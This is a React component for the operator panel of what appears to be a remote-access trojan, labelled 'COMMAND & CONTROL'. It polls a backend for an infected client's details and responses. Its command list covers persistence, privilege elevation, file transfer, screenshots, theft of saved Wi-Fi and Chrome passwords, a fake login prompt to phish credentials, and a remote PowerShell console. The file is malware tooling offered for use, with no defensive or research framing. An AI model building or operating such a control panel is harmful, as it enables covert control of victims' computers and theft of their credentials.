import React, {useEffect, useState} from 'react';
import {useParams} from "react-router-dom";
import Title from "react-titles/Title6";
import './ClientControl.css';
import {Spinner} from "reactstrap";
import ClientControlSection from './ClientControlSection'
import ClientControlCommand from './ClientControlCommand'
import ClientControlResponse from './ClientControlResponse';
import ClientControlInformationTable from './ClientControlInformationTable';
import axios from "../../../axios";

// TODO: get list of commands from DB
const commands = {
    'stayhome': 'Persistence',
    'elevate': 'Elevate',
    'upload': 'Upload',
    'download': 'Download',
    'change-image': 'Change Background',
    'capture': 'Take screenshot',
    'getwifi': 'Get Wifi Passwords',
    'webPass': 'Get Stored Chrome Passwords',
    'PromptUser': 'Prompt User UI Login',
    'get-network': 'Get Network Information',
    'StartPS': 'Start Powershell Console'
}

const ClientControl = () => {
    const {id} = useParams();
    const [client, setClient] = useState(undefined);
    const [clientStatus, setClientStatus] = useState(true);
    const [clientResponse, setClientResponse] = useState();
    const [allResponses, setAllResponses] = useState([]);

    useEffect(() => {
        const getClient = () => {

            axios({
                method: 'POST',
                url: '/api/clients/client',
                data:{
                    id:id
                }
            }).then((data)=>{
                if (Object.keys(data.data).length !== 0) {
                    delete data.data.user.__v
                    delete data.data.user._id
                    setClient(data.data.user);
                    setClientStatus(data.data.user.status);
                } else
                    return setClientStatus(false);
            }).catch((err)=> {
                console.log(err)
                setClientStatus(false)
            });

            const getResponse = () => {
                axios({
                    headers: {'Content-Type': 'application/json'},
                    url: `/api/response`,
                    method:'post',
                    data: JSON.stringify({id: id})
                    })
                    .then(data => {
                        if (Object.keys(data.data).length !== 0) {
                            setClientResponse(data.data);
                            setAllResponses(oldArray => [...oldArray, data.data]);
                        }
                    })
                    .catch(e => console.log(e))
            }
            getResponse();
        }
        getClient();
        let handle = setInterval(getClient, 5000);
        return () => {
            clearInterval(handle);
        };
    }, [id]);

    return (
        <div className="controlPageWrapper">
            <div className="title">
                <Title size={600} text1="COMMAND & CONTROL" open={true}/>
            </div>
            <div className="client-control-form-wrapper">
                {client !== undefined ?
                    <>
                        <ClientControlSection title="Client Information">
                            <ClientControlInformationTable client={client}/>
                        </ClientControlSection>
                        <ClientControlSection title="Command">
                            <ClientControlCommand client={client} commands={commands}/>
                        </ClientControlSection>
                        <ClientControlSection title="Response">
                            <ClientControlResponse clientResponse={clientResponse} allResponses={allResponses}/>
                        </ClientControlSection>
                    </> : <Spinner actions={"border"} color={"success"} type="grow"/>}
            </div>
        </div>
    );
}

export default ClientControl;
